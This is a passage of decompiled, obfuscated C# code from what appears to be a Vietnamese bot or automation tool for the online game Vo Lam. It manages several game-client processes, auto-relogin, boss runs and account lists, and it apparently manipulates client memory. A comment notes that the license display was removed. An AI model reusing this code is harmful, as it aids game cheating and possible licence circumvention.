		method_4(bool_35: false);
	}

	private void method_4(bool bool_35)
	{
		((Control)tabPageTrain).Enabled = bool_35;
		((Control)tabPagePhuchoi).Enabled = bool_35;
		((Control)tabPageMuathuoc).Enabled = bool_35;
		((Control)tabPageChieuthuc).Enabled = bool_35;
		buttonDanhsachCuusat.Enabled = bool_35;
	}

	private static void smethod_0(TabPage tabPage_0, bool bool_35, Color color_0)
	{
		foreach (Control control in tabPage_0.Controls)
		{
			if (control.ForeColor != color_0)
			{
				control.Enabled = bool_35;
			}
		}
	}

	private void method_5()
	{
		string text = "...";
		for (int i = 0; i < Class6.cityTransportData_0.Length; i++)
		{
			if (Class6.cityTransportData_0[i].uint_0 == null || Class6.cityTransportData_0[i].string_0 == null || !(Class6.cityTransportData_0[i].string_0 != string.Empty))
			{
				text = "(Chưa đầy đủ vị trí)";
				break;
			}
		}
		labelChuadaydu.Text = text;
	}

	private static void smethod_1(CharacterAccountConfig characterAccountConfig_2)
	{
		if (characterAccountConfig_2.uint_17 != 0)
		{
			Class24.smethod_2(characterAccountConfig_2.int_137, characterAccountConfig_2.uint_17);
		}
		if (characterAccountConfig_2.uint_30 != 0)
		{
			Class24.smethod_2(characterAccountConfig_2.int_137, characterAccountConfig_2.uint_30);
		}
	}

	private void method_6(string string_69, int int_159 = 0, bool bool_35 = false, int[] int_160 = null)
	{
		try
		{
			FormTip formTip = new FormTip();
			formTip.string_0 = string_69;
			formTip.bool_1 = !bool_35;
			if (int_160 == null || int_160.Length != 4)
			{
				int_160 = new int[4] { base.Left, base.Top, base.Width, base.Height };
			}
			formTip.int_0 = int_160[0];
			formTip.int_1 = int_160[1];
			formTip.int_2 = int_160[2];
			formTip.int_3 = int_160[3];
			formTip.int_4 = int_159;
			formTip.Show();
		}
		catch
		{
		}
	}

	private void timer_3_Tick(object sender, EventArgs e)
	{
		if (bool_28)
		{
			return;
		}
		bool_28 = true;
		try
		{
			if (Class11.bool_0 || bool_25)
			{
				Class11.bool_0 = true;
				Close();
				return;
			}
			if (Class95.int_0 < 0 || DateTime.Now.Ticks - long_2 > 1800000000L)
			{
				long_2 = DateTime.Now.Ticks;
				if (int_75 != 0)
				{
					Class95.int_0 = int_76 + 1;
				}
				else
				{
					Class95.int_0 = (int)Class51.smethod_1("volam.zing.vn");
				}
				if (Class95.int_0 < 200)
				{
					Class95.int_0 = 200;
				}
				else if (Class95.int_0 > 1500)
				{
					Class95.int_0 = 1500;
				}
			}
			if (FormDame.int_8 > 0 && FormDame.int_6 != FormDame.int_7)
			{
				FormDame.int_6 = FormDame.int_7;
				checkBoxDameMacdinh.Checked = FormDame.int_6 > 0;
				if (!Class24.smethod_52(Class81.characterAccountConfig_0.process_0))
				{
					DateTime now = DateTime.Now;
					string text = now.Hour + ":" + now.Minute + ":" + now.Second + " " + now.Millisecond;
					string text2 = "<color=pink>" + string_20[FormDame.int_6] + "<color=green> Dame kÕt hîp| " + text;
					if (int_126 != 0)
					{
						Class75.smethod_52(Class81.characterAccountConfig_0, text2);
					}
					else
					{
						Class75.smethod_55(Class81.characterAccountConfig_0, text2);
					}
				}
			}
			if (!bool_23)
			{
				long num = Class11.smethod_28(long_1);
				if (num > 3000L)
				{
					long_1 = Class11.smethod_27();
				}
				else if (num > 500L)
				{
					bool_23 = true;
				}
			}
			if (TryNewVersion.int_0 == 2)
			{
				Close();
				return;
			}
			if (Class81.bool_0 || int_140 != int_69)
			{
				int_140 = int_69;
				GClass0.smethod_1();
				if (int_69 > 0)
				{
					Thread.Sleep(150);
					GClass0.smethod_0();
				}
				Class81.bool_0 = false;
			}
			if (bool_17)
			{
				bool_17 = false;
				Class72.uint_1 = Class72.smethod_2(Class72.string_4);
				Class72.uint_0 = Class72.smethod_2(Class72.string_3);
				Class72.smethod_1(Class72.string_4, Class72.string_0);
				Class72.smethod_1(Class72.string_3, Class72.string_1);
				Class72.smethod_1(Class72.string_5, Class72.string_2);
			}
			method_7();
			try
			{
				if (bool_6 && gform0_0 != null && characterAccountConfig_1 != null && characterAccountConfig_1.Length != 0)
				{
					int num2 = -1;
					if (Class81.characterAccountConfig_0.int_136 > 0)
					{
						num2 = Class87.smethod_3(characterAccountConfig_1, Class81.characterAccountConfig_0.int_136);
					}
					if (num2 < 0)
					{
						num2 = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
					}
					if (num2 < 0 || characterAccountConfig_1[num2].process_0 == null || characterAccountConfig_1[num2].process_0.HasExited)
					{
						for (int i = 0; i < characterAccountConfig_1.Length; i++)
						{
							if (characterAccountConfig_1[i].process_0 != null && !characterAccountConfig_1[i].process_0.HasExited)
							{
								num2 = i;
								break;
							}
						}
					}
					if (bool_11)
					{
						int num3 = 8;
						num2 = ((characterAccountConfig_1.Length <= 8 || characterAccountConfig_1[num3].process_0 == null || characterAccountConfig_1[num3].process_0.HasExited) ? (-1) : num3);
					}
					if (num2 >= 0)
					{
						if (bool_6 && gform0_0 != null)
						{
							if (bool_11)
							{
								int num4 = 8;
								if (characterAccountConfig_1.Length > 8 && characterAccountConfig_1[num4].process_0 != null && !characterAccountConfig_1[num4].process_0.HasExited)
								{
									gform0_0.bool_1 = true;
									gform0_0.method_5(characterAccountConfig_1[num4]);
								}
								else
								{
									gform0_0.Hide();
								}
							}
							else
							{
								gform0_0.bool_1 = false;
								gform0_0.method_5(characterAccountConfig_1[num2]);
							}
						}
						if (bool_11 && num2 == 8)
						{
							int num5 = 0;
							switch ((comboBoxcauhinh != null) ? comboBoxcauhinh.Text : "")
							{
							case "400":
								num5 = 400;
								break;
							case "480":
								num5 = 480;
								break;
							case "512":
								num5 = 512;
								break;
							}
							if (num5 <= 0)
							{
								num5 = 400;
							}
						}
					}
				}
			}
			catch
			{
			}
			if (checkBoxFixtoadolag.Checked && bool_23 && !string.IsNullOrEmpty(string_50))
			{
				int_150++;
				if (int_150 >= 15)
				{
					method_44();
					int_150 = 0;
				}
			}
			else
			{
				int_150 = 0;
			}
			if (hienthithongke.Checked && characterAccountConfig_1 != null)
			{
				bool flag = false;
				if (Class81.characterAccountConfig_0.int_136 > 0)
				{
					int num6 = Class87.smethod_3(characterAccountConfig_1, Class81.characterAccountConfig_0.int_136);
					if (num6 >= 0 && characterAccountConfig_1[num6].bool_25)
					{
						flag = true;
					}
				}
				if (!flag)
				{
					int num7 = Class87.smethod_2(listView1, int_83, characterAccountConfig_1);
					if (num7 >= 0 && characterAccountConfig_1[num7].bool_25)
					{
						flag = true;
					}
				}
				if (flag)
				{
					int_50++;
					if (int_50 >= int_51)
					{
						method_61();
						int_50 = 0;
						dateTime_1 = DateTime.Now;
					}
				}
				else
				{
					hienthithongke.Checked = false;
					int_50 = 0;
				}
			}
			else
			{
				int_50 = 0;
			}
		}
		catch
		{
		}
		bool_28 = false;
	}

	private void method_7()
	{
		if (FormTuychon.int_2 > 1)
		{
			FormTuychon.int_2 = 0;
			if (int_42 > 0)
			{
				checkBoxChetnamIm.ForeColor = Color.DarkRed;
			}
			else
			{
				checkBoxChetnamIm.ForeColor = Color.Black;
			}
		}
		if (FormMenuClick.bool_1)
		{
			if (!(FormMenuClick.string_0 == string_44))
			{
				if (!(FormMenuClick.string_0 == FormLocdoTest.string_1))
				{
					if (FormMenuClick.string_0.IndexOf("PID:") == 0)
					{
						FormMenuClick.bool_1 = false;
						int num = Class11.smethod_11(FormMenuClick.string_0.Split(':')[1]);
						if (characterAccountConfig_1 != null)
						{
							for (int i = 0; i < characterAccountConfig_1.Length; i++)
							{
								if (characterAccountConfig_1[i].int_136 == num)
								{
									characterAccountConfig_1[i].int_9 = FormMenuClick.smethod_0();
									Class56.smethod_13(characterAccountConfig_1[i]);
									break;
								}
							}
						}
						textBoxClickNPCMenu.Text = Class11.smethod_69(FormMenuClick.int_2);
					}
				}
				else
				{
					FormMenuClick.bool_1 = false;
					FormLocdoTest.int_13 = FormMenuClick.smethod_0(FormLocdoTest.string_1);
					textBoxMenuTest.Text = Class11.smethod_69(FormLocdoTest.int_13);
				}
			}
			else
			{
				FormMenuClick.bool_1 = false;
				int_134 = FormMenuClick.smethod_0(string_44);
				textBoxMuaMienphiMenu.Text = Class11.smethod_69(int_134);
			}
		}
		if (!FormTip.bool_0)
		{
			if (bool_27)
			{
				if (!bool_29 && GClass1.string_5 != null && GClass1.string_5 != string.Empty)
				{
					bool_29 = true;
					string text = "LuuY";
					if (Class66.smethod_7(text, 0) != GClass1.string_5)
					{
						FormTip formTip = new FormTip();
						formTip.string_0 = GClass1.string_5;
						formTip.string_2 = text;
						formTip.string_1 = "LUU Y";
						formTip.Show();
					}
				}
			}
			else
			{
				bool_27 = true;
				string text2 = Class66.smethod_7("UpdateNew", 0);
				if (Class11.smethod_11(text2) != string_10.Length && string_10 != null && string_10 != string.Empty)
				{
					FormTip formTip2 = new FormTip();
					formTip2.bool_7 = true;
					formTip2.string_4 = "/index.html";
					formTip2.string_0 = string_10;
					formTip2.string_1 = "PHIEN BAN MOI";
					formTip2.Show();
				}
			}
		}
		if (int_147 != int_11 || int_146 != int_10)
		{
			int_146 = int_10;
			int_147 = int_11;
			bool flag = int_11 > 0 || int_10 > 0;
			richTextBoxChedoMayphu.Visible = flag;
			if (!flag)
			{
				checkBoxDenToadoUser.Enabled = !flag;
				textBoxToadoDen.Enabled = !flag;
				checkBoxDenToadoLeave.Enabled = !flag;
				checkBoxDenToadoALL.Enabled = !flag;
				bool_30 = false;
			}
		}
		if (AuxiliaryMachineManager.bool_1 && bool_30 != AuxiliaryMachineManager.bool_1 && (int_11 > 0 || int_10 > 0))
		{
			bool_30 = AuxiliaryMachineManager.bool_1;
			checkBoxDenToadoUser.Enabled = true;
			textBoxToadoDen.Enabled = true;
			checkBoxDenToadoLeave.Enabled = true;
			checkBoxDenToadoALL.Enabled = true;
		}
		if (0 <= int_4 && int_141 != int_4 && string_7 != null && int_4 < string_7.GetLength(0))
		{
			if (string_6 != string_7[int_4, 0])
			{
				string_6 = string_7[int_4, 0];
				comboBoxGameOfWeb.Text = string_6;
				Class66.smethod_11(Class66.smethod_1(), "TenWeb", string_6, "", 0);
			}
			if (string_7[int_4, 4] != null)
			{
				int num2 = string_7[int_4, 4].IndexOf("/");
				if (num2 > 0)
				{
					Class2.string_1 = string_7[int_4, 4].Substring(num2 + 1);
				}
			}
			if (string_9 != null)
			{
				for (int j = 0; j < string_9.Length; j++)
				{
					string text3 = string_9[j].ToLower();
					string[] array = string_6.ToLower().Split('-', '|');
					bool flag2 = false;
					for (int k = 0; k < array.Length; k++)
					{
						if (text3 == array[k].Trim())
						{
							flag2 = true;
							break;
						}
					}
					if (flag2)
					{
						if (int_71 == 0)
						{
							int_71 = 1;
							checkBoxDoiTitle.Checked = true;
							method_37();
						}
						break;
					}
				}
			}
			method_18(int_141 < 0);
			int_141 = int_4;
		}
		if (base.WindowState == FormWindowState.Minimized && !notifyIcon_0.Visible && int_135 <= 0)
		{
			notifyIcon_0.Visible = true;
			Hide();
		}
		if (!FormAntivirus.bool_0 && !FormAntivirus.bool_1 && FormAntivirus.gstruct55_0 != null && FormAntivirus.gstruct55_0.Length != 0)
		{
			try
			{
				FormAntivirus formAntivirus = new FormAntivirus();
				formAntivirus.Show();
			}
			catch
			{
			}
		}
		if (int_152 == 1)
		{
			int_152 = 2;
			buttonSuadoTaicho.Enabled = false;
			new Thread(method_17).Start();
		}
		else if (int_152 > 2)
		{
			int_152 = 0;
			buttonSuadoTaicho.Enabled = true;
		}
		if (FormXaphuCT.int_0 == -2)
		{
			FormXaphuCT.int_0 = 0;
			method_5();
		}
		if (Class76.string_0 != null && Class76.string_0.Length > 1)
		{
			textBoxMapNameVST.Text = Class1.smethod_1(Class76.string_0[0], 1);
			textBoxToadoVST.Text = Class76.string_0[1];
			Class76.string_0 = null;
		}
		if (Class11.string_17 != null && Class11.string_17.Length != 0)
		{
			if (Class11.string_17[0] != null && !(Class11.string_17[0] == string.Empty))
			{
				string text4 = Class11.string_17[0].Replace("|", Class56.string_7);
				if (Class11.smethod_1(text4, "MESS:") == 0)
				{
					Class11.smethod_30(ref Class11.string_17, Class11.string_17[0]);
					text4 = text4.Replace("MESS:", "");
					MessageBox.Show(text4, string.Empty, MessageBoxButtons.OK);
				}
				else if (Class11.smethod_1(text4, "FORM:") == 0)
				{
					if (!FormTip.bool_0)
					{
						Class11.smethod_30(ref Class11.string_17, Class11.string_17[0]);
						text4 = text4.Replace("FORM:", "");
						FormTip.smethod_0(string_49, text4, 60000, 360, 180, bool_8: false, base.Left, base.Top);
					}
				}
				else
				{
					Class11.smethod_30(ref Class11.string_17, Class11.string_17[0]);
					method_2(text4);
				}
			}
			else
			{
				Class11.smethod_30(ref Class11.string_17, Class11.string_17[0]);
			}
		}
		if (!GClass1.bool_0 && !bool_15)
		{
			return;
		}
		long num3 = Class11.smethod_28(long_3);
		if (Class26.gstruct14_0 != null && num3 > long_4)
		{
			long_4 = method_12();
			long_3 = Class11.smethod_27();
		}
		if (FormLogin.gstruct0_0 != null && FormLogin.gstruct0_0.Length != 0)
		{
			if (int_142 < 0 || FormLogin.gstruct0_0.Length <= int_142)
			{
				int_142 = 0;
			}
			GStruct0 gstruct0_ = FormLogin.gstruct0_0[int_142];
			if (gstruct0_.int_1 != 0 && !Class24.smethod_52(gstruct0_.process_0))
			{
				if (Class52.smethod_33(gstruct0_) > 0 && gstruct0_.int_0 <= 0)
				{
					FormLogin.gstruct0_0[int_142].int_0 = 1;
				}
			}
			else
			{
				if (gstruct0_.int_1 > 0)
				{
					FormLogin.gstruct0_0[int_142].int_1 = 0;
				}
				if (FormLogin.int_5 > 0)
				{
					if (gstruct0_.int_0 > 0)
					{
						string text5 = gstruct0_.string_0;
						if (gstruct0_.string_4 != null && gstruct0_.string_4 != string.Empty)
						{
							text5 = Class1.smethod_1(gstruct0_.string_4, 1);
						}
						method_2("[" + text5 + "] sẽ đăng nhập lại trong vài giây nữa...");
						Class11.smethod_38(ref Class48.int_0, int_142);
					}
				}
				else if (gstruct0_.int_0 > 0)
				{
					FormLogin.gstruct0_0[int_142].int_0 = 0;
				}
			}
			int_142++;
		}
		if (GClass1.int_2 == 1)
		{
			GClass1.int_2 = 0;
			buttonAdd.Visible = true;
			buttonAdd.Enabled = true;
			GClass1.smethod_3();
			// License display removed
			if (!bool_13 && bool_12)
			{
				if (GClass1.string_1 != null && !(GClass1.string_1 == "True"))
				{
					AuxiliaryMachineManager.bool_1 = true;
				}
				else
				{
					AuxiliaryMachineManager.bool_1 = false;
				}
				int num4 = -1;
				if (GClass1.string_0 == "All")
				{
					string text6 = Class66.smethod_7("TenWeb", 0, "khác");
					for (int l = 0; l < list_0.Count; l++)
					{
						if (text6 != string.Empty && text6 == list_0[l][0])
						{
							string_6 = list_0[l][0];
							int_4 = l;
							int_115 = Class11.smethod_11(list_0[int_4][3]);
						}
						if (list_0[l][0] == "khác")
						{
							num4 = l;
						}
						comboBoxGameOfWeb.Items.Add(list_0[l][0]);
					}
					if (int_4 < 0)
					{
						if (string_8 != null)
						{
							for (int m = 0; m < string_8.GetLength(0); m++)
							{
								if (!(text6 == string_8[m, 0]))
								{
									continue;
								}
								for (int n = 0; n < list_0.Count; n++)
								{
									if (string_8[m, 2] == list_0[n][2])
									{
										int_4 = n;
										int_115 = Class11.smethod_11(list_0[n][3]);
										Class66.smethod_11(Class66.smethod_1(), "TenWeb", list_0[n][0], "", 0);
										break;
									}
								}
								break;
							}
						}
						if (int_4 < 0)
						{
							int_4 = 0;
							int_115 = 3;
							if (num4 > 0)
							{
								int_4 = num4;
							}
						}
					}
					comboBoxGameOfWeb.SelectedIndex = int_4;
					bool_13 = true;
					buttonTuTimWeb.Enabled = true;
				}
				else
				{
					if (GClass1.string_1 != null && !(GClass1.string_1 == "True"))
					{
						AuxiliaryMachineManager.bool_1 = true;
					}
					else
					{
						AuxiliaryMachineManager.bool_1 = false;
					}
					for (int num5 = 0; num5 < list_0.Count; num5++)
					{
						if (GClass1.string_0 != string.Empty && GClass1.string_0 == list_0[num5][0])
						{
							int_4 = num5;
							int_115 = Class11.smethod_11(list_0[int_4][3]);
						}
						if (list_0[num5][0] == "khác")
						{
							num4 = num5;
						}
					}
					if (int_4 < 0)
					{
						if (string_8 != null)
						{
							for (int num6 = 0; num6 < string_8.GetLength(0); num6++)
							{
								if (!(GClass1.string_0 == string_8[num6, 0]))
								{
									continue;
								}
								for (int num7 = 0; num7 < list_0.Count; num7++)
								{
									if (string_8[num6, 2] == list_0[num7][2])
									{
										int_4 = num7;
										int_115 = Class11.smethod_11(list_0[num7][3]);
										Class66.smethod_11(Class66.smethod_1(), "TenWeb", list_0[num7][0], "", 0);
										break;
									}
								}
								break;
							}
						}
						if (int_4 < 0)
						{
							int_4 = 0;
							int_115 = 3;
							if (num4 > 0)
							{
								int_4 = num4;
							}
						}
					}
					string_6 = GClass1.string_0;
					comboBoxGameOfWeb.Items.Add(string_6);
					comboBoxGameOfWeb.SelectedIndex = 0;
					bool_13 = true;
					buttonTuTimWeb.Enabled = false;
				}
			}
		}
		if (GClass1.string_3 != null && GClass1.string_3 != string.Empty && !FormTip.bool_0)
		{
			string[] array2 = string_1.Split('.');
			if (array2.Length < 2)
			{
				array2 = new string[2] { string_1, "000" };
			}
			while (array2[0].Length < 3)
			{
				array2[0] = "0" + array2[0];
			}
			while (array2[1].Length < 3)
			{
				string[] array3;
				(array3 = array2)[1] = array3[1] + "0";
			}
			string[] array4 = GClass1.string_3.Split('.');
			if (array4.Length < 2)
			{
				array4 = new string[2]
				{
					GClass1.string_3,
					"000"
				};
			}
			while (array4[0].Length < 3)
			{
				array4[0] = "0" + array4[0];
			}
			while (array4[1].Length < 3)
			{
				string[] array5;
				(array5 = array4)[1] = array5[1] + "0";
			}
			while (array2[0].Length != array4[0].Length)
			{
				if (array2[0].Length < array4[0].Length)
				{
					array2[0] = "0" + array2[0];
				}
				else
				{
					array4[0] = "0" + array4[0];
				}
			}
			while (array2[1].Length != array4[1].Length)
			{
				if (array2[1].Length < array4[1].Length)
				{
					string[] array6;
					(array6 = array2)[1] = array6[1] + "0";
				}
				else
				{
					string[] array7;
					(array7 = array4)[1] = array7[1] + "0";
				}
			}
			int_6 = Class11.smethod_11(array2[0]) * 10000 + Class11.smethod_11(array2[1]);
			int_7 = Class11.smethod_11(array4[0]) * 10000 + Class11.smethod_11(array4[1]);
			if (int_6 < int_7)
			{
				bool_14 = true;
				string text7 = "ĐÃ CÓ BẢN CẬP NHẬT, Vui Lòng Chờ Chút||Phiên bản hiện tại là " + string_49 + ", hiện đã có phiên bản mới hơn là " + string_49.Replace(string_1, GClass1.string_3) + "||Bạn hãy vào thư mục autoupdate,bấm update version dde lên phiên bản mới hơn này nhé !";
				FormTip.smethod_0(string_49, text7, 45000, 280, 160, bool_8: false, base.Left, base.Top);
				new Thread(method_66).Start();
			}
			GClass1.string_3 = null;
		}
		if (GClass0.bool_0)
		{
			GClass0.bool_0 = false;
			int num8 = Class87.smethod_3(characterAccountConfig_1, Class81.characterAccountConfig_0.int_136);
			if (FormMagic.int_1 > 0 && 0 <= num8 && characterAccountConfig_1[num8].int_3 != null)
			{
				characterAccountConfig_1[num8].int_119 = 1 - Convert.ToByte(characterAccountConfig_1[num8].int_119 > 0);
				Class75.smethod_52(characterAccountConfig_1[num8], "<color=white>Cash bïa: <color=green>" + string_20[characterAccountConfig_1[num8].int_119]);
			}
		}
		if (GClass0.int_1 != Class30.int_6)
		{
			if (GClass0.int_1 != Class30.int_4)
			{
				if (GClass0.int_1 != Class30.int_3)
				{
					if (GClass0.int_1 == Class30.int_2)
					{
						GClass0.int_1 = 0;
						if (Class81.characterAccountConfig_0.int_136 > 0 && FormAchinh.int_0 > 0 && FormAchinh.string_0 != null && FormAchinh.string_0 != string.Empty)
						{
							if (FormAchinh.int_1 > 0 && characterAccountConfig_1 != null)
							{
								for (int num9 = 0; num9 < characterAccountConfig_1.Length; num9++)
								{
									if (FormAchinh.string_0 == Class1.smethod_1(characterAccountConfig_1[num9].string_22, 1))
									{
										GStruct8[] array8 = Class24.smethod_62(characterAccountConfig_1[num9].int_136, "WIN_CLASS:" + Class56.string_21);
										if (array8 != null && array8.Length != 0)
										{
											uint_3 = array8[0].uint_0;
											new Thread(method_10).Start();
										}
									}
								}
								uint_2 = Class46.characterSyncSnapshot_0.uint_0;
								new Thread(method_9).Start();
							}
							string text8 = string_22;
							string_22 = FormAchinh.string_0;
							comboBoxAccChinh.Items.Add(string_22);
							comboBoxAccChinh.Text = string_22;
							FormAchinh.string_0 = text8;
							Class66.smethod_11(Class66.smethod_1(), "AccChinhNameA", Class11.smethod_16(string_22), "", 0);
							Class66.smethod_11(Class66.smethod_1(), "AccChinh2", Class11.smethod_16(FormAchinh.string_0), "", 0);
						}
					}
				}
				else
				{
					if (Class81.characterAccountConfig_0.int_136 > 0)
					{
						bool flag3;
						int_35 = Convert.ToByte(flag3 = int_35 <= 0);
						checkBoxDanhquai.Checked = flag3;
						bool_31 = true;
						new Thread(method_8).Start();
					}
					GClass0.int_1 = 0;
				}
			}
			else
			{
				if (Class81.characterAccountConfig_0.int_136 > 0)
				{
					bool flag4;
					int_34 = Convert.ToByte(flag4 = int_34 <= 0);
					checkBoxTuve.Checked = flag4;
					bool_31 = false;
					new Thread(method_8).Start();
				}
				GClass0.int_1 = 0;
			}
		}
		else
		{
			int num10 = int_155 + 1;
			if (num10 > 2)
			{
				num10 = 0;
			}
			GClass0.int_1 = 0;
			method_24(num10);
		}
		if (int_148 <= 0)
		{
			int_148 = 1;
			if (int_70 > 0)
			{
				new Thread(TryNewVersion.smethod_4).Start();
			}
		}
		if (int_154 > 1)
		{
			int_154 = 0;
			buttonGiamCPUAll.Enabled = true;
		}
		if (FormChayBoss.bool_1)
		{
			FormChayBoss.bool_1 = false;
			comboBoxNoiBoss.Items.Clear();
			for (int num11 = 0; num11 < FormChayBoss.string_2.GetLength(0); num11++)
			{
				comboBoxNoiBoss.Items.Add(FormChayBoss.string_2[num11, 0]);
			}
			comboBoxNoiBoss.Text = FormChayBoss.string_2[0, 0];
			if (characterAccountConfig_1 != null)
			{
				for (int num12 = 0; num12 < characterAccountConfig_1.Length; num12++)
				{
					characterAccountConfig_1[num12].bool_1 = false;
					characterAccountConfig_1[num12].int_0 = 0;
				}
			}
			checkBoxTuChayBoss.Checked = false;
		}
		if (FormChayBoss.string_0 != null)
		{
			checkBoxTuChayBoss.Checked = false;
			comboBoxNoiBoss.Text = FormChayBoss.string_0;
			FormChayBoss.string_0 = null;
		}
		if (int_133 != FormDame.int_9)
		{
			int_133 = FormDame.int_9;
			labelKieudame.Text = "( " + (FormDame.int_9 + 1) + " )";
		}
		if (int_131 != null && int_131.Length != 0)
		{
			int num13 = int_131[0];
			int num14 = Class87.smethod_10(listView1, num13);
			Class11.smethod_39(ref int_131, num13);
			if (0 <= num14)
			{
				listView1.Items[num14].Checked = false;
			}
		}
		while (ThemXoaDanhsach.int_0 != null && ThemXoaDanhsach.int_0.Length != 0)
		{
			int num15 = ThemXoaDanhsach.int_0[0];
			Class11.smethod_39(ref ThemXoaDanhsach.int_0, num15);
			CharacterAccountConfig characterAccountConfig = Class56.smethod_8(num15);
			if (characterAccountConfig.int_136 != 0)
			{
				Class11.smethod_29(ref string_27, characterAccountConfig.int_136 + "==" + characterAccountConfig.string_22);
				Class11.smethod_30(ref string_26, characterAccountConfig.string_22);
				string text9 = comboBoxAccChinh.Text;
				if (text9 != string.Empty && text9 != null && Class1.smethod_1(characterAccountConfig.string_22, 1) == text9)
				{
					int_58 = characterAccountConfig.int_136;
				}
				if (FormDoiMauBang.gstruct2_0.string_0 != null && FormDoiMauBang.gstruct2_0.string_0 != string.Empty && Class1.smethod_1(characterAccountConfig.string_22, 1) == FormDoiMauBang.gstruct2_0.string_0)
				{
					FormDoiMauBang.gstruct2_0.characterAccountConfig_0 = characterAccountConfig;
					FormDoiMauBang.gstruct2_0.uint_0 = 0u;
				}
				Class87.smethod_5(listView1, characterAccountConfig);
				Class87.smethod_0(ref characterAccountConfig_1, characterAccountConfig);
				if (characterAccountConfig.int_2 > 0)
				{
					AuxiliaryMachineManager.int_0 = characterAccountConfig.int_136;
					new Thread(AuxiliaryMachineManager.smethod_3).Start();
					Thread.Sleep(150);
				}
				Class56.smethod_11(num15);
			}
		}
		while (ThemXoaDanhsach.int_1 != null && ThemXoaDanhsach.int_1.Length != 0)
		{
			int num16 = ThemXoaDanhsach.int_1[0];
			if (num16 == Class46.characterSyncSnapshot_0.int_0 || num16 == int_58)
			{
				int_58 = 0;
				Class46.characterSyncSnapshot_0.int_0 = 0;
			}
			if (num16 == FormDoiMauBang.gstruct2_0.characterAccountConfig_0.int_136)
			{
				FormDoiMauBang.gstruct2_0.characterAccountConfig_0 = new CharacterAccountConfig
				{
					int_136 = 0
				};
				FormDoiMauBang.gstruct2_0.uint_0 = 0u;
			}
			Class11.smethod_39(ref ThemXoaDanhsach.int_1, num16);
			int num17 = Class87.smethod_3(characterAccountConfig_1, num16);
			if (num17 >= 0)
			{
				CharacterAccountConfig characterAccountConfig2 = characterAccountConfig_1[num17];
				Class11.smethod_30(ref string_27, characterAccountConfig2.int_136 + "==" + characterAccountConfig2.string_22);
				Class24.smethod_32(characterAccountConfig2.int_137);
				Class87.smethod_1(ref characterAccountConfig_1, characterAccountConfig2);
			}
			int num18 = Class87.smethod_10(listView1, num16);
			if (num18 >= 0)
			{
				listView1.Items.RemoveAt(num18);
			}
		}
		if (listView1.Items != null && listView1.Items.Count > 0)
		{
			int num19 = 0;
			do
			{
				if (listView1.Items.Count > int_139)
				{
					int num20 = Class87.smethod_2(listView1, int_139, characterAccountConfig_1);
					if (num20 >= 0)
					{
						CharacterAccountConfig characterAccountConfig3 = characterAccountConfig_1[num20];
						if (Class81.int_4 > 0 && Class81.int_4 <= num20)
						{
							if (!characterAccountConfig3.bool_25 && (ulong)characterAccountConfig3.long_1 > 0uL)
							{
								if (Class11.smethod_28(characterAccountConfig3.long_1) > 30000L)
								{
									Class24.smethod_53(characterAccountConfig_1[num20].process_0);
									Class87.smethod_1(ref characterAccountConfig_1, characterAccountConfig_1[num20]);
									Class48.bool_2 = true;
									break;
								}
							}
							else
							{
								method_2(Class1.smethod_1(characterAccountConfig3.string_22, 1) + ": Quá số lượng cho phép của adgame");
								characterAccountConfig_1[num20].bool_25 = false;
								listView1.Items[int_139].Checked = false;
								if (characterAccountConfig3.long_1 == 0L)
								{
									characterAccountConfig_1[num20].long_1 = Class11.smethod_27();
								}
							}
						}
						else
						{
							if (!characterAccountConfig3.bool_40 && Class47.int_1 <= 0)
							{
								Class47.int_1 = characterAccountConfig3.int_136;
								new Thread(Class47.smethod_22).Start();
							}
							if (!characterAccountConfig3.bool_41 && Class47.int_0 <= 0)
							{
								Class47.int_0 = characterAccountConfig3.int_136;
								new Thread(Class47.smethod_18).Start();
							}
							if (!characterAccountConfig3.bool_48 && characterAccountConfig3.int_69[0] > 0 && FormRaovat.int_1 <= 0)
							{
								FormRaovat.int_1 = characterAccountConfig3.int_136;
								new Thread(FormRaovat.smethod_0).Start();
							}
							if (!characterAccountConfig3.bool_49 && characterAccountConfig3.bool_17 && Class28.int_1 <= 0)
							{
								Class28.int_1 = characterAccountConfig3.int_136;
								new Thread(Class28.smethod_13).Start();
							}
							if (Class24.smethod_52(characterAccountConfig3.process_0))
							{
								string text10 = characterAccountConfig3.int_136 + "==";
								if (string_27 != null)
								{
									for (int num21 = 0; num21 < string_27.Length; num21++)
									{
										if (Class11.smethod_1(string_27[num21], text10) == 0)
										{
											Class11.smethod_29(ref string_26, string_27[num21].Replace(text10, ""));
											Class11.smethod_30(ref string_27, string_27[num21]);
											break;
										}
									}
								}
								Class87.smethod_1(ref characterAccountConfig_1, characterAccountConfig3);
								listView1.Items.RemoveAt(int_139);
								break;
							}
							string text11 = "Khác";
							int num22 = Class38.smethod_31(characterAccountConfig3);
							int num23 = Class38.smethod_28(characterAccountConfig3);
							bool flag5 = num22 == 0 || num22 == 10 || num22 == 21;
							if (characterAccountConfig3.uint_51 != 0 && characterAccountConfig3.uint_84 != 0)
							{
								if (num23 > 0)
								{
									if (num22 < Class56.string_24.Length)
									{
										text11 = Class56.string_24[num22];
									}
								}
								else
								{
									text11 = "Out";
								}
							}
							else
							{
								text11 = "HƯ";
								num23 = 12345;
								if (characterAccountConfig_1 != null && characterAccountConfig_1.Length > 1)
								{
									Class24.smethod_53(characterAccountConfig3.process_0);
									goto IL_1fc0;
								}
								if (!FormTip.bool_0)
								{
									if (int_144 == 0)
									{
										string string_ = "[" + Class1.smethod_1(characterAccountConfig3.string_22, 1) + "] đang chạy trên game hư không dùng được.||Cách xử lý làm theo thứ tự sau:|1. Mở 1 game khác, để đó.|2. Thoát [" + Class1.smethod_1(characterAccountConfig3.string_22, 1) + "] và thoát game hư ở trên.|3. Log lại ac ở game vừa mới mở.|4. Xong, xài bình thường.";
										method_2(string_);
										FormTip.smethod_0(string_49, string_, 600000, 320, 160, bool_8: false, base.Left, base.Top);
									}
									int_144 = 1;
								}
							}
							if (listView1.Items[int_139].SubItems[1].Text != text11)
							{
								listView1.Items[int_139].SubItems[1].Text = text11;
							}
							int num24 = Class39.smethod_0(characterAccountConfig3);
							text11 = ((num23 == 12345) ? "Log ac thứ 2 rồi thóat game và ac này." : ((Class59.smethod_0(num24) == null || Class38.smethod_27(characterAccountConfig3) > 0) ? Class1.smethod_1(Class39.smethod_2(characterAccountConfig3), 1) : "Hậu doanh"));
							if (listView1.Items[int_139].SubItems[2].Text != text11)
							{
								listView1.Items[int_139].SubItems[2].Text = text11;
							}
							Color color = Color.Black;
							if (num23 > 0)
							{
								if (num23 != 12345)
								{
									if (!flag5)
									{
										if (characterAccountConfig3.int_2 <= 0)
